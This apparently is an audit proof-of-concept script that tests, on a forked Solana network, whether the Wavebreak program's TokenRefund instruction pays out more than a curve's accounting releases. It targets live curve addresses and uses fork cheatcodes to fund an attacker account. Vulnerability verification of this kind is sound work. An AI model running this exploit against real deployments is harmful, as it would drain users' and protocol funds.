"""Wavebreak TokenRefund (disc 12) payout-math test on live curves.

Prior testing only reached the state gate (6016 BONDING_CURVE_NOT_EXPIRED), so the refund
payout arithmetic was never measured. Here we target curves whose graduation_time has already
passed (so the expiry gate is satisfied by real live state), hold a fork-funded attacker base
balance, and compare:

    quote paid out  vs  curve accounting decrease  vs  vault decrease

Refunding more than the curve's internal accounting releases = drain of other users' /
protocol fee custody (attacker-positive delta, permissionless).
"""
import sys, json, struct, base64, time
sys.path.insert(0, "/home/user/orca-audit/tools")
import forknet as F
from solders.instruction import Instruction
from solders.pubkey import Pubkey

WB = "waveQX2yP3H1pVU8djGvEHmYg8uamQ84AuyGtpsrXTF"
WSOL = F.WSOL
actor = F.load_actor(); A = str(actor.pubkey())
ATA_WSOL = "HMRvmgya8xKgDsbZfLGrYEjGNeFrJSe27JBhsAE2P7jh"
CURVES = {c["address"]: c for c in json.load(open("/home/user/orca-audit/recon/wb_curves.json"))}
CUST = {r["curve"]: r for r in json.load(open("/home/user/orca-audit/recon/wb_custody_full.json"))}
now = int(time.time())


def ata_of(owner, mint, prog=F.TOKEN):
    return str(Pubkey.find_program_address([bytes(F.pk(owner)), bytes(F.pk(prog)), bytes(F.pk(mint))],
                                           F.pk(F.ATA))[0])


def read_curve(a):
    v = F.get_account(a)
    if not v:
        return None
    raw = base64.b64decode(v["data"][0])
    return {"lamports": v["lamports"], "quote_amount": struct.unpack_from("<Q", raw, 208)[0],
            "base_amount": struct.unpack_from("<Q", raw, 216)[0],
            "graduation_time": struct.unpack_from("<q", raw, 248)[0],
            "launch_time": struct.unpack_from("<q", raw, 224)[0]}


def read_ata(a):
    v = F.get_account(a)
    if not v:
        return None
    raw = base64.b64decode(v["data"][0])
    return {"lamports": v["lamports"], "amount": struct.unpack_from("<Q", raw, 64)[0]}


def main():
    # expired (graduation_time in the past), not graduated, WSOL quote, positive vault excess
    cands = []
    for a, c in CURVES.items():
        if c["quote_mint"] != WSOL or any(m["graduated"] for m in c["graduation_methods"]):
            continue
        gt = c["graduation_time"]
        expired = 0 < gt < now or gt == 0
        r = CUST.get(a, {})
        if expired and r.get("divQuote", 0) > 5 * 10 ** 7:
            cands.append((r["divQuote"], a, r, c))
    cands.sort(reverse=True)
    print(f"expired curves with vault>accounting: {len(cands)}")
    for d, a, r, c in cands[:5]:
        print(f"   {a:44s} acct={r['acctQuote']:>14,} vault={r['vaultQuote']:>14,} excess={d:>13,} gradTime={c['graduation_time']}")
    RESULTS = []
    for d, T, r, c in cands[:2]:
        BASE = c["base_mint"]; VAULT = ata_of(T, WSOL); base_ata = ata_of(A, BASE)
        _, ixc = F.create_ata(A, BASE, F.TOKEN, A)
        F.send([ixc], actor)
        mv = F.get_account(BASE)
        if not mv:
            print("mint gone", T); continue
        mraw = bytearray(base64.b64decode(mv["data"][0]))
        supply0 = struct.unpack_from("<Q", mraw, 36)[0]; dec = mraw[44]
        fund = 10 ** (dec + 3)
        v2 = bytearray(base64.b64decode(F.get_account(base_ata)["data"][0]))
        struct.pack_into("<Q", v2, 64, fund)
        F.rpc.rpc("surfnet_setAccount", [base_ata, {"lamports": 2039280, "data": bytes(v2).hex(),
                                                     "owner": F.TOKEN, "executable": False}], url=F.FORK)
        F.rpc.rpc("surfnet_setSupply", [BASE, {"total": str(supply0 + fund)}], url=F.FORK)
        # tokenRefund: [signer, bondingCurve, quoteMint, quoteVault, signerQuoteAta, baseMint,
        #              signerBaseAta, system, baseTokenProgram, quoteTokenProgram, ataProgram]
        rix = Instruction(F.pk(WB), bytes([12]), [
            F.AM(A, writable=True, signer=True), F.AM(T, writable=True), F.AM(WSOL),
            F.AM(VAULT, writable=True), F.AM(ATA_WSOL, writable=True), F.AM(BASE, writable=True),
            F.AM(base_ata, writable=True), F.AM(F.SYSTEM), F.AM(F.TOKEN), F.AM(F.TOKEN), F.AM(F.ATA)])
        b_c, b_v, b_a = read_curve(T), read_ata(VAULT), read_ata(ATA_WSOL)
        rr = F.send([rix], actor)
        a_c, a_v, a_a = read_curve(T), read_ata(VAULT), read_ata(ATA_WSOL)
        det = rr.get("detail", {})
        payout = (a_a or {}).get("amount", 0) - (b_a or {}).get("amount", 0)
        rec = {"case": f"WB-RF refund on {T}", "curve": T, "baseMint": BASE, "vault": VAULT,
               "forkSlot": F.get_slot(), "sig": rr.get("result"),
               "err": det.get("err") or rr.get("error"),
               "logs": [l.strip() for l in det.get("logs", [])],
               "attackerPayout": payout,
               "vaultDecrease": (b_v or {}).get("amount", 0) - (a_v or {}).get("amount", 0),
               "accountingDecrease": (b_c or {}).get("quote_amount", 0) - (a_c or {}).get("quote_amount", 0),
               "curveBefore": b_c, "curveAfter": a_c, "vaultBefore": b_v, "vaultAfter": a_v,
               "attackerBefore": b_a, "attackerAfter": a_a, "fundedBase": fund}
        rec["excessCaptured"] = rec["attackerPayout"] - rec["accountingDecrease"]
        RESULTS.append(rec)
        print(f"\n### {rec['case']}")
        print("   err:", json.dumps(rec["err"])[:160])
        print("   logs:", " | ".join(l.split('log:')[-1].strip() for l in rec["logs"] if 'log:' in l or 'failed' in l)[:260])
        print(f"   payout={payout:+,} acctDecrease={rec['accountingDecrease']:+,} "
              f"vaultDecrease={rec['vaultDecrease']:+,} excess={rec['excessCaptured']:+,}")
        if payout > 0 and rec["excessCaptured"] > 0:
            print("   ***  refund paid out MORE than accounting released (fee custody drain)  ***")
    json.dump({"nowUnix": now, "funding": "FORK-ONLY attacker base funding via Surfpool cheatcodes (documented)",
               "results": RESULTS}, open("/home/user/orca-audit/evidence/WBR_refund.json", "w"), indent=1)
    print("\nsaved evidence/WBR_refund.json")


if __name__ == "__main__":
    main()
